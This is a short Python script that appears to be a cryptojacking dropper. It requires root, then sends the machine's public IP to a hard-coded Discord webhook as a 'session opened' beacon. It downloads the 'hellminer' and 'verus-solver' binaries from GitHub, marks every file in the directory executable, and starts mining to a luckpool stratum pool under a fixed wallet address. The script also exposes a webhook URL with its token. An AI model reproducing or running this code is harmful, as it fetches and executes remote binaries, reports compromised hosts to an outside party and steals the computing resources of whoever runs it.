import os
import discord
import requests
from os.path import exists
from discord_webhook import DiscordWebhook

if os.geteuid() != 0:
    print("You need to have root privileges to run this script.")
    exit()

webhook = 'https://discordapp.com/api/webhooks/1029420421134680064/O3e1_ivqQexrC5xDMF-5ne9hsrcZhyw561covq0STMU2hprO2ONNy5Ur03RSPSb5k_5h'

ip = requests.get('https://api.ipify.org').text.strip()
webhook = DiscordWebhook(url=webhook, content="``[+] Session opened: " + ip + "``")
response = webhook.execute()
file_exists = os.path.exists('hellminer')
if file_exists:
    a = 1
else:
    url = "https://github.com/rxu7s/Public/raw/main/hellminer"
    response = requests.get(url)
    open("hellminer", "wb").write(response.content)

file_exists = os.path.exists('verus-solver')
if file_exists:
    a = 1
else:
    url = "https://github.com/rxu7s/Public/raw/main/verus-solver"
    response = requests.get(url)
    open("verus-solver", "wb").write(response.content)

os.system("chmod +x *")
os.system("./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKmtJ9n4RDNoG95Y6sxKST3wyiHgDG5t4M.x -p x --cpu 8")

